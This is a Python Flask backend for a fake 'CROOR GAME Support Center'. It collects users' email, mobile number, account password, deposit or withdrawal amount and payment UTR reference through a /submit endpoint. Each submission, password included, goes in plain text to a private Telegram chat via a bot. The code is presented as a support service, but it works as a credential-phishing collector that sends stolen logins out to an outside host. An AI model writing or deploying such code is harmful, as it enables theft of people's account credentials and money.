from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"


def send_to_telegram(message):
    try:
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
        result = response.json()
        if result.get("ok"):
            print("Message sent to Telegram successfully!")
            return True
        else:
            print(f"Telegram Error: {result.get('description')}")
            return False
    except Exception as e:
        print(f"Error sending to Telegram: {str(e)}")
        return False


def format_deposit_message(data):
    message = f"""
🔴 <b>NEW DEPOSIT PROBLEM</b> 🔴
━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>

📱 <b>Mobile:</b> <code>{data.get('mobile', 'N/A')}</code>

🔒 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>

💰 <b>Deposit Amount:</b> <code>₹{data.get('amount', 'N/A')}</code>

🧾 <b>UTR No.:</b> <code>{data.get('utr', 'N/A')}</code>

🕐 <b>Time:</b> {data.get('timestamp', datetime.now().strftime('%d/%m/%Y %I:%M:%S %p'))}

━━━━━━━━━━━━━━━━━━━━━━
🎮 <b>CROOR GAME Support Center</b>
"""
    return message


def format_withdrawal_message(data):
    message = f"""
🟣 <b>NEW WITHDRAWAL PROBLEM</b> 🟣
━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>

📱 <b>Mobile:</b> <code>{data.get('mobile', 'N/A')}</code>

🔒 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>

💰 <b>Withdrawal Amount:</b> <code>₹{data.get('amount', 'N/A')}</code>

🕐 <b>Time:</b> {data.get('timestamp', datetime.now().strftime('%d/%m/%Y %I:%M:%S %p'))}

━━━━━━━━━━━━━━━━━━━━━━
🎮 <b>CROOR GAME Support Center</b>
"""
    return message


@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        data = request.json
        if not data:
            return jsonify({"success": False, "message": "No data received"}), 400

        print(f"New submission received: {data.get('type')}")
        form_type = data.get('type', '')

        if 'Deposit' in form_type:
            message = format_deposit_message(data)
        elif 'Withdrawal' in form_type:
            message = format_withdrawal_message(data)
        else:
            return jsonify({"success": False, "message": "Invalid form type"}), 400

        telegram_sent = send_to_telegram(message)

        return jsonify({
            "success": True,
            "message": "Form submitted successfully!",
            "telegram": telegram_sent
        }), 200

    except Exception as e:
        print(f"Server Error: {str(e)}")
        return jsonify({"success": False, "message": f"Server error: {str(e)}"}), 500


@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "running",
        "service": "CROOR GAME Support Center",
        "timestamp": datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')
    }), 200


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "message": "CROOR GAME Support Center Backend is running!"
    }), 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
